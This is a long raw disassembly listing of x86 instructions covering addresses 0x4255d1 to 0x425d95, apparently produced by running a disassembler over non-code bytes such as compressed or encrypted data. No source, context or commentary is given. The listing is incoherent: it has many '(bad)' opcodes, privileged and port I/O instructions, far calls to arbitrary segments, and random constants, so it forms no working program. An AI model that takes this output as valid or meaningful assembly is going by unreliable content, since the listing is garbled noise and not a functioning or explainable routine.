  4255d1:	sub    eax,0xd2eb8cb6
  4255d6:	adc    DWORD PTR [ebp+0x23],eax
  4255d9:	dec    eax
  4255da:	js     0x4255fc
  4255dc:	ja     0x425630
  4255de:	and    eax,0xc5f66633
  4255e3:	mov    eax,ds:0x3d2bd283
  4255e8:	and    DWORD PTR [ebx-0x72a62d06],ebx
  4255ee:	sbb    al,0x23
  4255f0:	sub    eax,0x92a3d489
  4255f5:	mov    BYTE PTR [ebx+0x11],ch
  4255f8:	arpl   WORD PTR [esi-0x25ad268a],si
  4255fe:	lds    esi,FWORD PTR [ebx+0x68ca3377]
  425604:	das    
  425605:	xlat   BYTE PTR ds:[ebx]
  425606:	mov    bl,0xb6
  425608:	and    bl,BYTE PTR [edi]
  42560a:	mov    ds:0xcfaebbaa,al
  42560f:	(bad)  
  425610:	jns    0x425610
  425612:	call   0x74d4eb60
  425617:	sbb    eax,0xd381c432
  42561c:	or     edx,edx
  42561e:	scas   eax,DWORD PTR es:[edi]
  42561f:	mov    ch,0x0
  425621:	or     al,0xc1
  425623:	mov    esp,0xfe64591f
  425628:	aad    0xde
  42562a:	inc    ebp
  42562b:	adc    ah,BYTE PTR [edx+0x314679dd]
  425631:	sbb    BYTE PTR [ebx],0x53
  425634:	inc    edx
  425635:	cwde   
  425636:	adc    BYTE PTR ds:0x911ff881,cl
  42563d:	sbb    al,0x84
  42563f:	lahf   
  425640:	pop    ebx
  425641:	and    DWORD PTR [esi-0x5b],eax
  425644:	pop    esi
  425645:	cmp    ch,BYTE PTR [ebx-0x1065a108]
  42564b:	aad    0x25
  42564d:	adc    al,0xf4
  42564f:	retf   
  425650:	and    BYTE PTR [edi],ah
  425652:	scas   eax,DWORD PTR es:[edi]
  425653:	push   ebp
  425654:	ins    BYTE PTR es:[edi],dx
  425655:	adc    al,0x3a
  425657:	inc    ebp
  425658:	sbb    BYTE PTR [esi-0x33],0xc
  42565c:	call   0xeb38:0xa2b0550c
  425663:	and    al,0x5a
  425665:	sar    dh,0x25
  425668:	stc    
  425669:	sub    eax,0x95f2ceeb
  42566e:	lds    ecx,FWORD PTR [ebp+0x77d92fcd]
  425674:	into   
  425675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425676:	and    edi,edi
  425678:	cmp    dl,BYTE PTR [edx+eiz*8-0x4a2b337]
  42567f:	jg     0x42566e
  425681:	or     DWORD PTR ss:[edx+0x72067292],eax
  425688:	sbb    DWORD PTR [ecx],esp
  42568a:	xor    ch,BYTE PTR [esi+0x6c]
  42568d:	rol    BYTE PTR [eax-0x578eaeff],1
  425693:	repz mov ds:0x94608d3c,al
  425699:	iret   
  42569a:	pop    ss
  42569b:	adc    ch,dl
  42569d:	in     eax,0x6e
  42569f:	mov    bh,0xf4
  4256a1:	jle    0x4256dc
  4256a3:	jge    0x42571c
  4256a5:	or     al,0xdb
  4256a7:	and    al,0x95
  4256a9:	mov    cl,0x5
  4256ab:	(bad)  
  4256ac:	inc    ebx
  4256ad:	fdivr  DWORD PTR [ebx+eiz*2-0x5c023b0c]
  4256b4:	dec    ecx
  4256b5:	mov    eax,0xd7740670
  4256ba:	inc    esi
  4256bb:	ret    0x7886
  4256be:	xor    esi,DWORD PTR [edi+0x720994fd]
  4256c4:	mov    BYTE PTR [ecx+edi*8],ah
  4256c7:	push   0xafd6920d
  4256cc:	xchg   ebp,eax
  4256cd:	mov    esi,0xe442ac5d
  4256d2:	int3   
  4256d3:	aas    
  4256d4:	xor    al,0x70
  4256d6:	sub    eax,eax
  4256d8:	push   0x2a8eea54
  4256dd:	xchg   ebp,eax
  4256de:	xchg   esi,eax
  4256df:	pusha  
  4256e0:	shl    dl,cl
  4256e2:	pop    ecx
  4256e3:	call   0x86ee:0x464de081
  4256ea:	mov    ds:0x67950f4a,eax
  4256ef:	sub    ecx,esi
  4256f1:	inc    ebx
  4256f2:	(bad)  
  4256f3:	jo     0x425711
  4256f5:	add    ebx,DWORD PTR [edi]
  4256f7:	xchg   edx,eax
  4256f8:	sbb    al,0xb1
  4256fa:	clc    
  4256fb:	ret    
  4256fc:	mov    gs,ebp
  4256fe:	dec    ebp
  4256ff:	add    BYTE PTR [edi-0x1e],ah
  425702:	out    dx,eax
  425703:	jge    0x42576a
  425705:	mov    ds:0xabe69f9b,eax
  42570a:	mov    ch,0xc6
  42570c:	jne    0x4256e9
  42570e:	inc    esp
  42570f:	(bad)  
  425710:	cs out dx,al
  425712:	xor    esi,0xb8a666e9
  425718:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425719:	out    dx,al
  42571a:	push   esi
  42571b:	push   esi
  42571c:	mov    ebx,0xd09f9e75
  425721:	jg     0x4256ac
  425723:	sub    al,0x44
  425725:	jmp    0x425757
  425727:	(bad)  
  425728:	aad    0x11
  42572a:	add    DWORD PTR [edx],0x17
  42572d:	mov    edi,0x260b88ec
  425732:	shl    BYTE PTR [ecx-0x64],1
  425735:	sbb    esi,DWORD PTR [edx]
  425737:	add    DWORD PTR [eax],eax
  425739:	leave  
  42573a:	adc    BYTE PTR [ecx],0xe
  42573d:	cdq    
  42573e:	lds    edx,FWORD PTR [ecx+0x5b]
  425741:	and    dh,BYTE PTR [eax+eiz*4]
  425744:	cli    
  425745:	xchg   ecx,eax
  425746:	xchg   edi,eax
  425747:	popa   
  425748:	jne    0x425728
  42574a:	dec    eax
  42574b:	es stos DWORD PTR es:[edi],eax
  42574d:	repnz sub bh,BYTE PTR [ebx+ebx*4]
  425751:	mov    ebp,ebp
  425753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425754:	(bad)  
  425755:	push   gs
  425757:	retf   
  425758:	mov    ch,0x4b
  42575a:	repnz xor BYTE PTR [ecx+0x740cc97f],ah
  425761:	add    esi,DWORD PTR [esp+eax*2-0x37]
  425765:	jl     0x4256ec
  425767:	ins    BYTE PTR es:[edi],dx
  425768:	gs jns 0x4257a4
  42576b:	add    eax,0x8341199a
  425770:	stos   DWORD PTR es:[edi],eax
  425771:	adc    eax,0x14a24710
  425776:	push   ds
  425777:	mov    ch,0xa7
  425779:	inc    eax
  42577a:	push   edi
  42577b:	outs   dx,DWORD PTR ds:[esi]
  42577c:	jnp    0x425742
  42577e:	fwait
  42577f:	mov    edx,0x2e0a03c
  425784:	adc    dl,BYTE PTR [esi+0x8]
  425787:	jg     0x4257a6
  425789:	sbb    BYTE PTR [ebp+0x2e],dh
  42578c:	mov    ds:0x41169bd5,eax
  425791:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425792:	das    
  425793:	pop    eax
  425794:	jle    0x42579c
  425796:	leave  
  425797:	into   
  425798:	call   0x5cd:0x2c10e9c8
  42579f:	out    0x32,al
  4257a1:	inc    ecx
  4257a2:	and    ebx,DWORD PTR [eax+0x5343a186]
  4257a8:	add    BYTE PTR [eax],al
  4257aa:	dec    edx
  4257ab:	inc    ebx
  4257ac:	push   ebp
  4257ad:	push   esi
  4257ae:	pop    ebp
  4257af:	push   esi
  4257b0:	dec    ebx
  4257b1:	pop    edi
  4257b2:	idiv   bl
  4257b4:	(bad)
  4257b8:	mov    ch,0x59
  4257ba:	mov    al,0xe5
  4257bc:	add    DWORD PTR [eax],eax
  4257be:	xchg   BYTE PTR [esi],al
  4257c0:	add    BYTE PTR [eax],al
  4257c2:	mov    esi,0x2eedc2d4
  4257c7:	lods   al,BYTE PTR ds:[esi]
  4257c8:	ins    DWORD PTR es:[edi],dx
  4257c9:	fld    DWORD PTR [ebp-0x5365b438]
  4257cf:	fist   WORD PTR [esi]
  4257d1:	sub    BYTE PTR [ecx],ch
  4257d3:	pop    ss
  4257d4:	adc    edi,ecx
  4257d6:	retf   
  4257d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257d8:	call   0xe038:0xe53f600e
  4257df:	add    BYTE PTR [ecx+0x558b123b],bh
  4257e5:	sbb    DWORD PTR [edi-0x8],esi
  4257e8:	(bad)  
  4257e9:	adc    esi,DWORD PTR [esi+0x6d]
  4257ec:	pushf  
  4257ed:	imul   ebx,DWORD PTR [ecx+0x60],0xffffffb5
  4257f1:	jbe    0x425825
  4257f3:	cld    
  4257f4:	loope  0x4257e6
  4257f6:	int    0x45
  4257f8:	jg     0x425822
  4257fa:	add    dh,0x17
  4257fd:	or     eax,0xa03f98bd
  425802:	jecxz  0x4257ef
  425804:	dec    edi
  425805:	not    DWORD PTR [edi+0x7c4bcad]
  42580b:	ins    BYTE PTR es:[edi],dx
  42580c:	js     0x42579b
  42580e:	dec    bp
  425810:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425811:	sub    DWORD PTR [ebx-0x41411323],0x8ee5aef4
  42581b:	ret    0x98d9
  42581e:	enter  0xed2d,0x70
  425822:	retf   0x6594
  425825:	cwde   
  425826:	mov    ebp,0x1ca47c35
  42582b:	into   
  42582c:	ret    0xb624
  42582f:	lods   al,BYTE PTR ds:[esi]
  425830:	cdq    
  425831:	mov    ah,0xc4
  425833:	mov    ecx,0x951a6cea
  425838:	xchg   ebx,eax
  425839:	ret    
  42583a:	push   ecx
  42583b:	inc    edx
  42583c:	sub    eax,DWORD PTR [edx+eiz*4-0x3e4b8a22]
  425843:	dec    edx
  425844:	aam    0x2f
  425846:	ins    DWORD PTR es:[edi],dx
  425847:	ret    
  425848:	jmp    0x425856
  42584a:	neg    DWORD PTR [esi+0x38a93e09]
  425850:	icebp  
  425851:	mov    ebx,0xdb3f6962
  425856:	fistp  QWORD PTR [edx]
  425858:	dec    ebx
  425859:	call   0xe6fbbeca
  42585e:	inc    esp
  42585f:	cmc    
  425860:	int    0x7b
  425862:	ret    
  425863:	bound  ebp,QWORD PTR [esi]
  425865:	cmc    
  425866:	test   eax,0x45ac3f3a
  42586b:	ds aaa 
  42586d:	test   BYTE PTR [ecx],bl
  42586f:	sub    BYTE PTR [ebp-0x280ca59f],bl
  425875:	dec    ecx
  425876:	or     dl,bh
  425878:	cmp    ebp,eax
  42587a:	mov    ebx,0xbb665fa1
  42587f:	int3   
  425880:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425881:	ins    BYTE PTR es:[edi],dx
  425882:	and    dh,cl
  425884:	fimul  DWORD PTR fs:[ebp+0x47]
  425888:	clc    
  425889:	sbb    eax,0x36df57b8
  42588e:	adc    eax,0x26fb8cd
  425893:	pop    ebp
  425894:	fisttp WORD PTR es:[esi-0x2d]
  425898:	dec    esi
  425899:	dec    ecx
  42589a:	loope  0x42586a
  42589c:	into   
  42589d:	xor    esp,DWORD PTR [ebx-0x2cdf3033]
  4258a3:	jmp    0x4258ac
  4258a5:	jp     0x4258d3
  4258a7:	mov    edi,0xbae27aca
  4258ac:	(bad)  
  4258ad:	fstp   TBYTE PTR [ebp+0x1d]
  4258b0:	pop    esi
  4258b1:	retf   
  4258b2:	xchg   ebx,eax
  4258b3:	bound  eax,QWORD PTR [ecx-0x54]
  4258b6:	jmp    0x12842136
  4258bb:	sub    edx,DWORD PTR [edx-0x43]
  4258be:	clc    
  4258bf:	das    
  4258c0:	inc    ecx
  4258c1:	jbe    0x42589a
  4258c3:	call   0xb4ff:0xc5746566
  4258ca:	xchg   ebp,eax
  4258cb:	mov    WORD PTR [eax],cs
  4258cd:	or     al,0x93
  4258cf:	inc    edi
  4258d0:	retf   
  4258d1:	jmp    0x42588e
  4258d3:	sbb    esi,DWORD PTR [ecx+0x14]
  4258d6:	mov    ecx,0x88d6d248
  4258db:	adc    al,0xb7
  4258dd:	xor    DWORD PTR [edx-0x521e1f3a],eax
  4258e3:	cmp    DWORD PTR [eax+0x69],esp
  4258e6:	add    al,BYTE PTR [esp+ebx*4-0xb]
  4258ea:	lods   eax,DWORD PTR ds:[esi]
  4258eb:	int    0x6d
  4258ed:	or     eax,0x626927e3
  4258f2:	fcmovbe st,st(7)
  4258f4:	lds    ecx,FWORD PTR [ecx-0x7e]
  4258f7:	jge    0x4258bb
  4258f9:	call   0x94da:0x49bfe816
  425900:	dec    esi
  425901:	cs push ebx
  425903:	dec    esi
  425904:	loope  0x4258a2
  425906:	mov    bl,0xae
  425908:	icebp  
  425909:	scas   eax,DWORD PTR es:[edi]
  42590a:	jb     0x425956
  42590c:	arpl   WORD PTR [ebx+eiz*8+0x52aa1252],bp
  425913:	push   edx
  425914:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425915:	jns    0x4258f0
  425917:	aam    0x8a
  425919:	dec    ebp
  42591a:	adc    BYTE PTR [eax+0x4c5b2394],dh
  425920:	jno    0x425976
  425922:	mov    edx,0xf9489edd
  425927:	mov    edx,DWORD PTR ds:0xf5cecf48
  42592d:	jle    0x425964
  42592f:	cli    
  425930:	push   0x71
  425932:	xor    edx,0xfffffff7
  425935:	div    DWORD PTR ds:0xbedcd4a
  42593b:	xchg   ebp,eax
  42593c:	imul   edi,edi,0xb203587a
  425942:	rol    BYTE PTR [ebx+0x723f76ca],0x19
  425949:	xor    BYTE PTR [ecx],bl
  42594b:	in     al,0x2b
  42594d:	sahf   
  42594e:	push   es
  42594f:	rcr    BYTE PTR [edx],0xcd
  425952:	mov    dh,0x9b
  425954:	or     eax,0xf5308223
  425959:	call   FWORD PTR [ecx]
  42595b:	inc    eax
  42595c:	outs   dx,BYTE PTR ds:[esi]
  42595d:	(bad)  
  42595e:	(bad)  
  425960:	sbb    BYTE PTR [edi+ebp*2+0xf40ff4c],dh
  425967:	stc    
  425968:	(bad)  
  425969:	jnp    0x425952
  42596b:	cmp    esp,DWORD PTR [ecx]
  42596d:	int3   
  42596e:	bound  edi,QWORD PTR [eax]
  425970:	ret    
  425971:	in     eax,dx
  425972:	cs pop ss
  425974:	fs push 0xa1dbb238
  42597a:	retf   0x5cce
  42597d:	xchg   DWORD PTR [eax+ecx*8],ecx
  425980:	aas    
  425981:	mov    al,ds:0x55d62dc6
  425986:	aam    0xdf
  425988:	pop    esp
  425989:	aas    
  42598a:	adc    DWORD PTR [esi],ebp
  42598c:	mov    BYTE PTR [edi+0x3e3f9264],cl
  425992:	stos   BYTE PTR es:[edi],al
  425993:	scas   eax,DWORD PTR es:[edi]
  425994:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425995:	pop    ebx
  425996:	ins    BYTE PTR es:[edi],dx
  425997:	bound  esp,QWORD PTR [ecx]
  425999:	pop    ebp
  42599a:	out    0xb3,eax
  42599c:	ffreep st(6)
  42599e:	cmc    
  42599f:	repnz add eax,0xb0a36b91
  4259a5:	mov    cl,0xb0
  4259a7:	fnstsw WORD PTR [edi]
  4259a9:	std    
  4259aa:	ins    BYTE PTR es:[edi],dx
  4259ab:	out    dx,al
  4259ac:	pop    edx
  4259ad:	mov    edx,0xadb2c5bf
  4259b2:	retf   0xf0e5
  4259b5:	inc    ebp
  4259b6:	lahf   
  4259b7:	arpl   WORD PTR [eax],si
  4259b9:	xchg   edx,eax
  4259ba:	retf   0xbe95
  4259bd:	push   cs
  4259be:	ins    BYTE PTR es:[edi],dx
  4259bf:	shl    DWORD PTR [edi+ebx*4+0x49],cl
  4259c3:	rcl    BYTE PTR [ebx+eax*1+0xd0a9f40],cl
  4259ca:	jmp    0xec6f:0x277600b7
  4259d1:	mov    ss,esi
  4259d3:	out    0x50,eax
  4259d5:	mov    ebp,0xcec46a75
  4259da:	loope  0x425a18
  4259dc:	push   0x324a6627
  4259e1:	ret    
  4259e2:	adc    DWORD PTR [ebx+ebx*4],edi
  4259e5:	iret   
  4259e6:	mov    WORD PTR [edx],ds
  4259e8:	sbb    dh,bh
  4259ea:	ret    
  4259eb:	call   0xe7130c5b
  4259f0:	gs sahf 
  4259f2:	mov    edi,0x5167cbe7
  4259f7:	pop    es
  4259f8:	ss sar edi,1
  4259fb:	js     0x425a5a
  4259fd:	loop   0x4259af
  4259ff:	push   0x43
  425a01:	sub    ebx,DWORD PTR [esi+eiz*2+0x512dc417]
  425a08:	sub    dh,BYTE PTR [eax]
  425a0a:	sbb    esi,eax
  425a0c:	ja     0x425a5b
  425a0e:	or     BYTE PTR [esi],ch
  425a10:	das    
  425a11:	fwait
  425a12:	mov    es,WORD PTR ds:0x85d50f0b
  425a18:	scas   al,BYTE PTR es:[edi]
  425a19:	aam    0x95
  425a1b:	cwde   
  425a1c:	push   esp
  425a1d:	inc    ecx
  425a1e:	add    BYTE PTR [ebx],0x67
  425a21:	aad    0xdb
  425a23:	inc    edx
  425a24:	mov    ah,0xcf
  425a26:	and    eax,0xd57243c8
  425a2b:	push   esi
  425a2c:	addr16 jge 0x425a33
  425a2f:	call   0x1859c572
  425a34:	jno    0x425a1c
  425a36:	cmc    
  425a37:	retf   
  425a38:	inc    ebp
  425a39:	pop    es
  425a3a:	repz pop esp
  425a3c:	cmp    edx,DWORD PTR [ecx+0x7e]
  425a3f:	call   DWORD PTR [eax-0xa417c47]
  425a45:	jge    0x425ab0
  425a47:	pop    esi
  425a48:	int    0xee
  425a4a:	push   ss
  425a4b:	jmp    0x4259d9
  425a4d:	inc    ecx
  425a4e:	loope  0x425a49
  425a50:	push   ebp
  425a51:	dec    edi
  425a52:	xchg   bl,cl
  425a54:	repz push 0x6c3d23fc
  425a5a:	popa   
  425a5b:	push   esp
  425a5c:	aad    0xd6
  425a5e:	pushf  
  425a5f:	jmp    0x83e4:0x7628d903
  425a66:	adc    BYTE PTR [eax+ebx*8-0x369a1682],bl
  425a6d:	or     cl,ah
  425a6f:	into   
  425a70:	retf   
  425a71:	mov    dh,0x1b
  425a73:	or     eax,0xde9553f9
  425a78:	sbb    DWORD PTR [esi-0x2947b311],ebx
  425a7e:	das    
  425a7f:	mov    ah,0xaa
  425a81:	stos   DWORD PTR es:[edi],eax
  425a82:	addr16 push esp
  425a84:	fistp  DWORD PTR [edx]
  425a86:	dec    BYTE PTR [edi-0x23]
  425a89:	js     0x425aac
  425a8b:	aas    
  425a8c:	sbb    al,0x70
  425a8e:	xchg   edi,eax
  425a8f:	dec    edx
  425a90:	(bad)
  425a93:	and    DWORD PTR [ebp-0x8d2d955],0x15fa5eb5
  425a9d:	mov    al,ds:0x20d67c58
  425aa2:	adc    eax,0x581993ce
  425aa7:	into   
  425aa8:	pop    esp
  425aa9:	xchg   esi,eax
  425aaa:	xchg   esi,eax
  425aab:	sbb    edi,ecx
  425aad:	sub    al,0x75
  425aaf:	je     0x425a86
  425ab1:	test   BYTE PTR [eax],ch
  425ab3:	xor    BYTE PTR [edi-0x18],bh
  425ab6:	dec    eax
  425ab7:	push   es
  425ab8:	retf   0x72de
  425abb:	cmp    ebp,ecx
  425abd:	or     ah,BYTE PTR [edi]
  425abf:	test   BYTE PTR [eax-0xfb6582b],0x3f
  425ac6:	lahf   
  425ac7:	or     ah,BYTE PTR [edi+edx*4]
  425aca:	mov    ebp,0xf3ebbb89
  425acf:	jb     0x425b49
  425ad1:	dec    ebx
  425ad2:	dec    ecx
  425ad3:	mov    ch,0x39
  425ad5:	jno    0x425a75
  425ad7:	add    al,0x9c
  425ad9:	in     al,dx
  425ada:	jl     0x425a96
  425adc:	jne    0x425b0f
  425ade:	jae    0x425a61
  425ae0:	pusha  
  425ae1:	out    dx,eax
  425ae2:	push   ss
  425ae3:	out    dx,eax
  425ae4:	push   ebx
  425ae5:	mov    ch,0x14
  425ae7:	call   0x4a98:0x4c87161
  425aee:	icebp  
  425aef:	fwait
  425af0:	add    al,al
  425af2:	icebp  
  425af3:	push   0x2b
  425af5:	push   0x69
  425af7:	cmp    al,0xdb
  425af9:	popaw  
  425afb:	cli    
  425afc:	mov    ecx,0xdb672c7
  425b01:	mov    ebx,0x3b03fc8c
  425b06:	jg     0x425b2e
  425b08:	in     al,dx
  425b09:	scas   eax,DWORD PTR es:[edi]
  425b0a:	push   0xfe8e79c
  425b0f:	push   edx
  425b10:	ins    BYTE PTR es:[edi],dx
  425b11:	sbb    al,0xc8
  425b13:	adc    ebx,DWORD PTR [ecx+ebp*2+0x2b]
  425b17:	stos   DWORD PTR es:[edi],eax
  425b18:	xchg   esp,eax
  425b19:	sub    BYTE PTR [edx-0x571f730d],al
  425b1f:	shr    BYTE PTR [eax-0x62dfe0e],0x52
  425b26:	scas   al,BYTE PTR es:[edi]
  425b27:	inc    ebp
  425b28:	pop    ebp
  425b29:	hlt    
  425b2a:	inc    ebx
  425b2b:	jae    0x425b25
  425b2d:	or     ebp,DWORD PTR [bx+di+0x17]
  425b31:	es dec edx
  425b33:	popf   
  425b34:	adc    eax,0xb4e17240
  425b39:	jnp    0x425b0a
  425b3b:	push   ebp
  425b3c:	lahf   
  425b3d:	test   DWORD PTR ds:0x1a4c615b,esi
  425b43:	adc    al,0xbd
  425b45:	xchg   DWORD PTR [eax+eiz*8],edi
  425b48:	fmul   QWORD PTR [ebx+0x51]
  425b4b:	in     al,dx
  425b4c:	sub    ebp,DWORD PTR [ebp-0x7c]
  425b4f:	jecxz  0x425b60
  425b51:	push   eax
  425b52:	cld    
  425b53:	inc    ebx
  425b54:	pop    es
  425b55:	pop    ss
  425b56:	jbe    0x425af2
  425b58:	mov    edi,0xac15b368
  425b5d:	mov    bl,0x4e
  425b5f:	call   FWORD PTR [ebp-0x54]
  425b62:	mov    al,0x39
  425b64:	rcr    DWORD PTR [ebx-0x57],cl
  425b67:	xchg   DWORD PTR [esi-0x3f88b159],ecx
  425b6d:	mov    ch,0x1e
  425b6f:	jecxz  0x425b5b
  425b71:	add    cl,bh
  425b73:	call   0x486377b0
  425b78:	rcr    BYTE PTR [eax+ebx*8-0xe],0xd6
  425b7d:	cmp    al,0xb7
  425b7f:	jmp    0xe6d39431
  425b84:	scas   eax,DWORD PTR es:[edi]
  425b85:	pusha  
  425b86:	je     0x425bc8
  425b88:	mov    ds:0xaa19ca42,eax
  425b8d:	stos   BYTE PTR es:[edi],al
  425b8e:	repnz pop ebp
  425b90:	mul    BYTE PTR [esi+0x1f72e728]
  425b96:	pop    eax
  425b97:	scas   eax,DWORD PTR es:[edi]
  425b98:	(bad)  
  425b99:	hlt    
  425b9a:	jg     0x425b7b
  425b9c:	push   edx
  425b9d:	or     BYTE PTR [edx+0x45ac08da],al
  425ba3:	aad    0x29
  425ba5:	push   ecx
  425ba6:	sbb    ah,BYTE PTR [ebx-0x752d96d1]
  425bac:	cmp    bl,ch
  425bae:	jo     0x425b89
  425bb0:	sbb    eax,esi
  425bb2:	mov    dh,0xf3
  425bb4:	inc    ebp
  425bb5:	cmp    al,0xb7
  425bb7:	scas   eax,DWORD PTR es:[edi]
  425bb8:	mov    dh,0x56
  425bba:	loopne 0x425bb3
  425bbc:	ins    BYTE PTR es:[edi],dx
  425bbd:	sbb    BYTE PTR [ebp+0x5ea1a31f],cl
  425bc3:	add    al,0xf7
  425bc5:	push   0x56
  425bc7:	out    0x60,al
  425bc9:	outs   dx,DWORD PTR ds:[esi]
  425bca:	mov    esi,0x4c439d25
  425bcf:	inc    ecx
  425bd0:	call   0x23ad12c9
  425bd5:	mov    ebx,0xbd956e42
  425bda:	neg    BYTE PTR [edi-0x1f]
  425bdd:	adc    DWORD PTR [edi],edx
  425bdf:	xlat   BYTE PTR ds:[ebx]
  425be0:	stc    
  425be1:	out    dx,eax
  425be2:	fnstenv [edx]
  425be4:	xchg   esp,eax
  425be5:	pop    ebx
  425be6:	add    DWORD PTR [edi+0x39],edx
  425be9:	or     BYTE PTR [eax+esi*2+0x412a11be],0x74
  425bf1:	sar    BYTE PTR [esi+eax*4-0x20054429],0xc9
  425bf9:	ficom  DWORD PTR [esi+0x3f]
  425bfc:	call   0x8ccb3f18
  425c01:	fcomp  QWORD PTR [eax]
  425c03:	or     eax,0x71cf9d37
  425c08:	ja     0x425c51
  425c0a:	in     eax,dx
  425c0b:	scas   al,BYTE PTR es:[edi]
  425c0c:	in     eax,dx
  425c0d:	inc    edx
  425c0e:	paddw  mm3,QWORD PTR [ebx-0x3f7e54d2]
  425c15:	out    dx,eax
  425c16:	adc    ebp,DWORD PTR [eax+0x7cbb2ccb]
  425c1c:	mov    DWORD PTR [ecx-0xc],esi
  425c1f:	mov    DWORD PTR [edi-0x7b3305e5],esi
  425c25:	xchg   ecx,eax
  425c26:	xchg   BYTE PTR [ebx+ebp*1+0x4e945bf9],bl
  425c2d:	or     eax,0x9aa82e7f
  425c32:	mov    ch,0x26
  425c34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c35:	lods   al,BYTE PTR ds:[esi]
  425c36:	fild   WORD PTR [ebx-0x6e3de1b0]
  425c3c:	mov    al,ds:0x2a7a30e5
  425c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c42:	fisttp QWORD PTR [ecx+0x3b]
  425c45:	aam    0x23
  425c47:	pop    edx
  425c48:	mov    ecx,0x87798080
  425c4d:	and    DWORD PTR [edx-0x198e3653],ebx
  425c53:	ja     0x425c6b
  425c55:	dec    esi
  425c56:	inc    ebp
  425c57:	pop    ss
  425c58:	pop    ebx
  425c59:	hlt    
  425c5a:	shl    BYTE PTR [ebx],1
  425c5c:	call   0x6b9e:0x674ab398
  425c63:	xor    ah,BYTE PTR [edx]
  425c65:	pop    esp
  425c66:	pop    ebp
  425c67:	jns    0x425c8d
  425c69:	pop    ss
  425c6a:	mov    esi,0xebd376fa
  425c6f:	(bad)  
  425c70:	bswap  esi
  425c72:	sub    ebx,esp
  425c74:	pop    esp
  425c75:	clc    
  425c76:	fmul   QWORD PTR [edi-0x39c5a1a0]
  425c7c:	test   BYTE PTR [edx-0x63],al
  425c7f:	loop   0x425cbd
  425c81:	mov    ah,0x10
  425c83:	js     0x425cb4
  425c85:	pop    ecx
  425c86:	pop    edi
  425c87:	ins    DWORD PTR es:[edi],dx
  425c88:	lock mov al,0xd3
  425c8b:	adc    al,0x3d
  425c8d:	ret    0x83d4
  425c90:	and    al,0x94
  425c92:	mov    ah,0x88
  425c94:	shl    DWORD PTR [edi-0x2],0x7
  425c98:	ror    DWORD PTR ds:0x94b1e0cf,0x79
  425c9f:	daa    
  425ca0:	stos   BYTE PTR es:[edi],al
  425ca1:	pop    ds
  425ca2:	(bad)  
  425ca3:	sub    ebp,esp
  425ca5:	xchg   edi,eax
  425ca6:	in     al,dx
  425ca7:	clc    
  425ca8:	mov    bl,0xf1
  425caa:	outs   dx,BYTE PTR ds:[esi]
  425cab:	push   ebp
  425cac:	sbb    eax,0x4618f35c
  425cb1:	test   eax,0xd4a7a02d
  425cb6:	xchg   ebp,eax
  425cb7:	pop    ds
  425cb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425cb9:	sub    DWORD PTR [ebx],ebp
  425cbb:	push   eax
  425cbc:	hlt    
  425cbd:	sbb    eax,0x493fe04a
  425cc2:	add    eax,0x93050088
  425cc7:	xor    eax,0xce14598a
  425ccc:	push   ds
  425ccd:	int    0xaf
  425ccf:	(bad)  [bx-0xdc0]
  425cd4:	lods   al,BYTE PTR ds:[esi]
  425cd5:	clc    
  425cd6:	and    bh,cl
  425cd8:	loop   0x425d07
  425cda:	xchg   ebp,eax
  425cdb:	fdiv   st,st(3)
  425cdd:	inc    esp
  425cde:	or     al,0x12
  425ce0:	arpl   WORD PTR [eax+0x474a2001],dx
  425ce6:	clc    
  425ce7:	pop    ebp
  425ce8:	push   ebx
  425ce9:	xor    DWORD PTR [ebx-0x6b275983],edx
  425cef:	dec    ebp
  425cf0:	(bad)  
  425cf2:	push   ss
  425cf3:	stc    
  425cf4:	xchg   ecx,eax
  425cf5:	(bad)  [edx+0x8]
  425cf8:	movmskps ebp,xmm1
  425cfb:	adc    eax,0x14cda244
  425d00:	popa   
  425d01:	enter  0xe719,0x3e
  425d05:	repnz cmp BYTE PTR [esi-0x6d1e5c16],0x85
  425d0d:	dec    esi
  425d0e:	cld    
  425d0f:	sub    eax,0x6525b614
  425d14:	scas   al,BYTE PTR es:[edi]
  425d15:	arpl   WORD PTR ss:[ecx-0x69],bx
  425d19:	fdivr  QWORD PTR [eax]
  425d1b:	scas   al,BYTE PTR es:[edi]
  425d1c:	das    
  425d1d:	mov    ds:0x21133fe2,eax
  425d22:	lods   eax,DWORD PTR ds:[esi]
  425d23:	xor    dx,WORD PTR [edi+eiz*2-0x1c352953]
  425d2b:	cmp    dl,BYTE PTR [eax-0x320d4f43]
  425d31:	jmp    0xb0c55503
  425d36:	lea    ebx,[esp+ebx*4]
  425d39:	add    DWORD PTR [ebp-0x19f9cada],esi
  425d3f:	adc    al,0x20
  425d41:	inc    edi
  425d42:	and    BYTE PTR [esi+0xcd13b52],dl
  425d48:	adc    ah,BYTE PTR [eax]
  425d4a:	inc    esp
  425d4b:	pushf  
  425d4c:	mov    ch,0xf2
  425d4e:	pop    esp
  425d4f:	(bad)  
  425d50:	sbb    DWORD PTR [esi+0x43],ecx
  425d53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425d54:	std    
  425d55:	or     DWORD PTR [ebx-0x58],eax
  425d58:	jg     0x425d19
  425d5a:	sahf   
  425d5b:	pop    edx
  425d5c:	lods   eax,DWORD PTR ds:[esi]
  425d5d:	shl    BYTE PTR [esi],0x4a
  425d60:	nop
  425d61:	sbb    eax,0x2e7f8c29
  425d66:	push   0x5e
  425d68:	test   BYTE PTR [esi-0x7867e88d],bl
  425d6e:	add    ebx,DWORD PTR [edi]
  425d70:	jbe    0x425d5c
  425d72:	jmp    0x8c84e214
  425d77:	cmp    ebp,DWORD PTR [esi+0x287714c0]
  425d7d:	fnstsw WORD PTR [esi+0x69491e12]
  425d83:	rcl    BYTE PTR [ecx+edx*8+0x5f7d5661],1
  425d8a:	mov    ebx,0x7f633360
  425d8f:	mov    al,0x75
  425d91:	ret    
  425d92:	es dec edx
  425d94:	iret   
  425d95:	xchg   BYTE PTR [edi+0x7a],cl
